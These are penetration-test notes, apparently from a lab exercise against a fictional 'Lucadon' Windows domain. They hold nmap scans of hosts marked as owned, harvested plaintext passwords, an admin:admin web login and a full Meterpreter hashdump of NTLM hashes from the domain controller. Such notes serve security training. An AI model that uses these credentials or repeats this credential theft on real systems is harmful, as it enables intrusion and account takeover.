## Nmap
### 10.130.9.10 OWNED
open ports:
53 - Microsoft DNS
88 - Microsoft Windows Kerberos
135 - Microsoft Windows RPC
139 - Microsoft Windows netbios-ssn
389 - Microsoft Windows netbios-ssn
445 - microsoft-ds
464 - kpasswd5
593 - ncacn_http
636 - tcpwrapped
3268 - ldap
3269 - tcpwrapped
3389 - ms-wbt-server

### 10.130.9.11 OWNED
open ports:
80 - Microsoft IIS httpd
445 - microsoft-ds
3389 - Microsoft Terminal Services

### 10.130.9.12 - OWNED
open ports:
445 - microsoft-ds
1433 - Microsoft SQL Server
3389 - Microsoft Terminal Services

### 10.130.9.21 OWNED
open ports:
135 - msrpc
445 - microsoft-ds
3389 - Microsoft Terminal Services

### 10.130.9.22 OWNED
open ports:
135 - msrpc
445 - microsoft-ds
3389 - Microsoft Terminal Services

### 10.130.9.30 - sql02 has ssh key on some other box - it is the jcarter hash OWNED
open ports:
22 - OpenSSH 8.0 protocol 2.0
111 - rpcbind
3306 - mysql

### 10.130.9.39 - OWNED
open ports 
22 - OpenSSh 8.2p1 Ubuntu 4ubuntu0.2
80 - http Apache 2.4.41 - user/pass for /admin admin:admin
got ssh key



### Default creds: 
```
Due to a recent increase in security breaches, all employess are required to change their network passwords from the default of Welcome_2_lucadon. Several employees still have not confirmed compliance. Any issues or questions please send an email to security@lucadon.com

#default creds are:
Welcome_2_lucadon
```

from the robert behnk email: `Jessic@B!3!8791`

from hashdump: SROCAdmin:1003:aad3b435b51404eeaad3b435b51404ee:c799825a0ace65ee41eb69ddb1f6196b:::

full hashdump from dc01:
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc8c088931837a202c663959e3797361:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5ea0470f6ff9875f9b4fae45d88711ed:::
SROCAdmin:1000:aad3b435b51404eeaad3b435b51404ee:c799825a0ace65ee41eb69ddb1f6196b:::
SVC_SQLService:1104:aad3b435b51404eeaad3b435b51404ee:de7069a3e6f967106febeebfa3c7f056:::
elocke:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
fsouik:1106:aad3b435b51404eeaad3b435b51404ee:7f92cebbdd22682f73793e48d6bb1b50:::
jkelly:1107:aad3b435b51404eeaad3b435b51404ee:75ebfac14c17c96f20684902c8b5234c:::
krosterman:1108:aad3b435b51404eeaad3b435b51404ee:2fcc82e9615c6a08e7ba6c9ecb80c548:::
rbehnke:1109:aad3b435b51404eeaad3b435b51404ee:7fbe15c3b3338a04cf60b5b9ba648443:::
smorgan:1110:aad3b435b51404eeaad3b435b51404ee:766fb58c71e198f9e5a60d4a16c0429e:::
sthorisdottir:1111:aad3b435b51404eeaad3b435b51404ee:0752757b9da9be435ec15341de390def:::
tduncan:1112:aad3b435b51404eeaad3b435b51404ee:7fbe15c3b3338a04cf60b5b9ba648443:::
DC01$:1001:aad3b435b51404eeaad3b435b51404ee:f1ceddc483b3c2ac19069f3ae6921d54:::
WS01$:1113:aad3b435b51404eeaad3b435b51404ee:13ac53fe341061eed03bc5a6c05d22cb:::
SQL01$:1114:aad3b435b51404eeaad3b435b51404ee:54a0ab70b7fafae5f0e43400d1d500a7:::
WEB01$:1115:aad3b435b51404eeaad3b435b51404ee:f0592a935420356b197eb0faf519944f:::
WS02$:1116:aad3b435b51404eeaad3b435b51404ee:76739b295371f8571a1c2492bbe5475a:::
```

from ws02:
```
Local Backup Server is attached to this workstation. I keep this server to make sure it does not get any domain policies or GPOs, and I can test my new Lucadon .NET applications!

Instructions to Connect:
- RDP from this machine to IP address of the bkup01 server.
- Credentials are:

Name: bkup01\smorgan
Password: b4ck_th@t_th1ng_uP

Note: To connect to this device from outside the network,  I have a File on my Desktop that will allow me to get Remote Administrator Access.

```

notes from roberts email on halicronbank.com: 
```
Lucadon Domain Credentials have been created.  Pleasee login with:
Password:  Spring2021
b
Username:  lucadon\rbehnk nsllokupr
```

